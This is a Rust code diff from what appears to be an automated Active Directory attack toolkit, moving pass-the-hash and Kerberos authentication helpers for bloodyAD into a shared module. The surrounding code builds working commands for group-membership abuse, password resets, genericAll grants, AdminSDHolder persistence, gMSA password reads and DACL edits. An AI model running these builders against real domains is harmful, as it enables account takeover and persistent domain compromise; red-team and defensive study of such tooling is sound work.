@@ -22,107 +22,11 @@ fn domain_to_base_dn(domain: &str) -> String {
         .join(",")
 }
 
-/// The all-zero LM half every modern NTLM stack expects in front of an NT
-/// hash. Tools that take `LMHASH:NTHASH` reject a bare 32-hex NT hash.
-const EMPTY_LM_HASH: &str = "aad3b435b51404eeaad3b435b51404ee";
-
-/// Argument keys the credential resolver uses for NTLM hash material, in
-/// lookup order.
-const NTLM_HASH_KEYS: &[&str] = &["hash", "nt_hash", "ntlm_hash"];
-
-/// Error returned when a tool has no usable auth material at all.
-const NO_AUTH_MATERIAL: &str = "missing auth material: supply one of `ticket_path` \
-     (Kerberos ccache), `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash), or `password`";
-
-/// First non-empty NTLM hash argument, checked in [`NTLM_HASH_KEYS`] order.
-fn ntlm_hash_arg(args: &Value) -> Option<&str> {
-    NTLM_HASH_KEYS.iter().find_map(|key| {
-        optional_str(args, key)
-            .map(str::trim)
-            .filter(|s| !s.is_empty())
-    })
-}
-
-/// Normalize an NTLM hash argument to the `LMHASH:NTHASH` form.
-///
-/// A bare 32-hex NT hash gains the empty-LM prefix; an existing `LM:NT` pair
-/// (including impacket's `:NT` short form) passes through with the LM half
-/// filled in. Anything else is rejected — a malformed value handed to
-/// bloodyAD is silently treated as a cleartext password and burns a bind
-/// attempt against the account lockout counter.
-fn lm_nt_hash_pair(raw: &str) -> Result<String> {
-    fn is_hex32(s: &str) -> bool {
-        s.len() == 32 && s.chars().all(|c| c.is_ascii_hexdigit())
-    }
-
-    let trimmed = raw.trim();
-    match trimmed.split_once(':') {
-        Some((lm, nt)) if is_hex32(nt) && lm.is_empty() => Ok(format!("{EMPTY_LM_HASH}:{nt}")),
-        Some((lm, nt)) if is_hex32(nt) && is_hex32(lm) => Ok(format!("{lm}:{nt}")),
-        None if is_hex32(trimmed) => Ok(format!("{EMPTY_LM_HASH}:{trimmed}")),
-        _ => anyhow::bail!(
-            "malformed NTLM hash argument ({} chars): expected a 32-hex NT hash \
-             or LMHASH:NTHASH",
-            trimmed.len()
-        ),
-    }
-}
-
-/// Build a `bloodyAD` command with authentication already applied, ready for
-/// the caller to append the subcommand (`add groupMember …`, `set password …`,
-/// `add genericAll …`) and a timeout.
-///
-/// Auth precedence: `ticket_path` > NTLM hash (`hash`/`nt_hash`/`ntlm_hash`) >
-/// `password`. A non-empty `ticket_path` wins because the cross-forest
-/// credential resolver injects an inter-realm ccache that an NTLM bind would
-/// reject with 0x52e (Bug B). The hash branch feeds bloodyAD's `-p` flag,
-/// which accepts `LMHASH:NTHASH` for NTLM authentication — without it every
-/// ACL edge discovered from a hash-only foothold converts to zero exploitation
-/// because the tool bails with "missing required argument: password".
-///
-/// bloodyAD's `-k` is variadic (`nargs='*'`) and takes keyword arguments like
-/// `ccache=<path>`; there is NO `-K` flag. Passing `-k -K <path>` made argparse
-/// consume `-K` as an unknown token and `<path>` landed in the subcommand slot,
-/// so bloodyAD rejected the whole call. `KRB5CCNAME`/`KRB5_CONFIG` are exported
-/// as a belt-and-braces fallback that recent bloodyAD versions read directly.
-fn bloodyad_base(args: &Value, domain: &str, dc_ip: &str) -> Result<CommandBuilder> {
-    if let Some(tpath) = optional_str(args, "ticket_path").filter(|s| !s.is_empty()) {
-        let (ccname_key, ccname_val) = credentials::kerberos_env(tpath);
-        let (cfg_key, cfg_val) = credentials::krb5_config_env(tpath);
-        return Ok(CommandBuilder::new("bloodyAD")
-            .flag("-d", domain)
-            .flag("--host", dc_ip)
-            .arg("-k")
-            .arg(format!("ccache={tpath}"))
-            .env(ccname_key, ccname_val)
-            .env(cfg_key, cfg_val));
-    }
-
-    let username = required_str(args, "username")?;
-
-    if let Some(raw) = ntlm_hash_arg(args) {
-        return Ok(CommandBuilder::new("bloodyAD")
-            .flag("-d", domain)
-            .flag("-u", username)
-            .flag("-p", lm_nt_hash_pair(raw)?)
-            .flag("--host", dc_ip));
-    }
-
-    let password = optional_str(args, "password")
-        .filter(|s| !s.is_empty())
-        .ok_or_else(|| anyhow::anyhow!("{NO_AUTH_MATERIAL}"))?;
-    Ok(
-        CommandBuilder::new("bloodyAD").args(credentials::bloodyad_creds(
-            domain, username, password, dc_ip,
-        )),
-    )
-}
-
 /// Add a user to a group via `bloodyAD add groupMember`.
 ///
 /// Required args: `domain`, `dc_ip`, `group`, `target_user`
 /// Auth — one of (precedence: ticket_path > hash > password), see
-/// [`bloodyad_base`]:
+/// [`credentials::bloodyad_base`]:
 ///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k ccache=<path>`)
 ///   - `username` + `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash)
 ///   - `username` + `password` (plaintext NTLM bind)
@@ -145,7 +49,7 @@ pub fn build_bloodyad_add_group_member(args: &Value) -> Result<CommandBuilder> {
     // `action` (default "add") lets teardown pass "remove" to reverse the write.
     let action = optional_str(args, "action").unwrap_or("add");
 
-    Ok(bloodyad_base(args, domain, dc_ip)?
+    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
         .arg(action)
         .arg("groupMember")
         .arg(group)
@@ -157,7 +61,7 @@ pub fn build_bloodyad_add_group_member(args: &Value) -> Result<CommandBuilder> {
 ///
 /// Required args: `domain`, `dc_ip`, `target_user`, `new_password`
 /// Auth — one of (precedence: ticket_path > hash > password), see
-/// [`bloodyad_base`]:
+/// [`credentials::bloodyad_base`]:
 ///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k ccache=<path>`)
 ///   - `username` + `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash)
 ///   - `username` + `password` (plaintext NTLM bind)
@@ -176,7 +80,7 @@ pub fn build_bloodyad_set_password(args: &Value) -> Result<CommandBuilder> {
     let target_user = required_str(args, "target_user")?;
     let new_password = required_str(args, "new_password")?;
 
-    Ok(bloodyad_base(args, domain, dc_ip)?
+    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
         .arg("set")
         .arg("password")
         .arg(target_user)
@@ -188,7 +92,7 @@ pub fn build_bloodyad_set_password(args: &Value) -> Result<CommandBuilder> {
 ///
 /// Required args: `domain`, `dc_ip`, `target_dn`, `principal`
 /// Auth — one of (precedence: ticket_path > hash > password), see
-/// [`bloodyad_base`]:
+/// [`credentials::bloodyad_base`]:
 ///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k ccache=<path>`)
 ///   - `username` + `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash)
 ///   - `username` + `password` (plaintext NTLM bind)
@@ -208,7 +112,7 @@ pub fn build_bloodyad_add_genericall(args: &Value) -> Result<CommandBuilder> {
     // `action` (default "add") lets teardown pass "remove" to reverse the grant.
     let action = optional_str(args, "action").unwrap_or("add");
 
-    Ok(bloodyad_base(args, domain, dc_ip)?
+    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
         .arg(action)
         .arg("genericAll")
         .arg(target_dn)
@@ -221,7 +125,7 @@ pub fn build_bloodyad_add_genericall(args: &Value) -> Result<CommandBuilder> {
 /// Required args: `domain`, `username`, `dc_ip`, `principal`
 /// Optional args: `right` (default: `"FullControl"`)
 /// Auth: `ticket_path` > `hash`/`nt_hash`/`ntlm_hash` > `password`, see
-/// [`bloodyad_base`].
+/// [`credentials::bloodyad_base`].
 pub async fn adminsd_holder_add_ace(args: &Value) -> Result<ToolOutput> {
     build_adminsd_holder_add_ace(args)?.execute().await
 }
@@ -236,7 +140,7 @@ pub fn build_adminsd_holder_add_ace(args: &Value) -> Result<CommandBuilder> {
     let base_dn = domain_to_base_dn(domain);
     let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");
 
-    Ok(bloodyad_base(args, domain, dc_ip)?
+    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
         .arg("add")
         .arg("aclEntry")
         .arg(&adminsd_dn)
@@ -251,13 +155,13 @@ pub fn build_adminsd_holder_add_ace(args: &Value) -> Result<CommandBuilder> {
 /// Required args: `domain`, `dc_ip`, `target`
 /// Optional args: `attr` (single attribute to read; omit for all)
 /// Auth: same as the other bloodyAD tools (username+password, ticket, or hash
-///       via [`bloodyad_base`]).
+///       via [`credentials::bloodyad_base`]).
 pub async fn bloodyad_get_object(args: &Value) -> Result<ToolOutput> {
     let domain = required_str(args, "domain")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let target = required_str(args, "target")?;
 
-    let mut cmd = bloodyad_base(args, domain, dc_ip)?
+    let mut cmd = credentials::bloodyad_base(args, domain, dc_ip)?
         .arg("get")
         .arg("object")
         .arg(target);
@@ -271,7 +175,7 @@ pub async fn bloodyad_get_object(args: &Value) -> Result<ToolOutput> {
 ///
 /// Required args: `domain`, `username`, `dc_ip`, `gmsa_account`
 /// Auth: `ticket_path` > `hash`/`nt_hash`/`ntlm_hash` > `password`, see
-/// [`bloodyad_base`].
+/// [`credentials::bloodyad_base`].
 pub async fn gmsa_read_password_bloodyad(args: &Value) -> Result<ToolOutput> {
     build_gmsa_read_password_bloodyad(args)?.execute().await
 }
@@ -282,7 +186,7 @@ pub fn build_gmsa_read_password_bloodyad(args: &Value) -> Result<CommandBuilder>
     let dc_ip = required_str(args, "dc_ip")?;
     let gmsa_account = required_str(args, "gmsa_account")?;
 
-    Ok(bloodyad_base(args, domain, dc_ip)?
+    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
         .arg("get")
         .arg("object")
         .arg(gmsa_account)
@@ -553,7 +457,7 @@ pub async fn pygpoabuse_immediate_task(args: &Value) -> Result<ToolOutput> {
 /// Required args: `domain`, `username`, `dc_ip`, `target`, `attribute`,
 /// `value`.
 /// Auth: `ticket_path` > `hash`/`nt_hash`/`ntlm_hash` > `password`, see
-/// [`bloodyad_base`].
+/// [`credentials::bloodyad_base`].
 ///
 /// `target` is the SAM account name or DN of the object being modified.
 /// `attribute` is the LDAP attribute name (e.g. `userPrincipalName`,
@@ -577,7 +481,7 @@ pub fn build_bloodyad_set_object_attr(args: &Value) -> Result<CommandBuilder> {
     let attribute = required_str(args, "attribute")?;
     let value = required_str(args, "value")?;
 
-    Ok(bloodyad_base(args, domain, dc_ip)?
+    Ok(credentials::bloodyad_base(args, domain, dc_ip)?
         .arg("set")
         .arg("object")
         .arg(target)
@@ -632,7 +536,7 @@ pub fn build_dacl_edit(args: &Value) -> Result<CommandBuilder> {
             .arg("-no-pass")
             .env(ccname_key, ccname_val)
             .env(cfg_key, cfg_val);
-    } else if let Some(raw) = ntlm_hash_arg(args) {
+    } else if let Some(raw) = credentials::ntlm_hash_arg(args) {
         cmd = cmd
             .arg(credentials::impacket_target(
                 Some(domain),
@@ -640,12 +544,12 @@ pub fn build_dacl_edit(args: &Value) -> Result<CommandBuilder> {
                 None,
                 dc_ip,
             ))
-            .args(credentials::hash_args(&lm_nt_hash_pair(raw)?))
+            .args(credentials::hash_args(&credentials::lm_nt_hash_pair(raw)?))
             .arg("-no-pass");
     } else {
         let password = optional_str(args, "password")
             .filter(|s| !s.is_empty())
-            .ok_or_else(|| anyhow::anyhow!("{NO_AUTH_MATERIAL}"))?;
+            .ok_or_else(|| anyhow::anyhow!("{}", credentials::NO_AUTH_MATERIAL))?;
         cmd = cmd.arg(credentials::impacket_target(
             Some(domain),
             username,
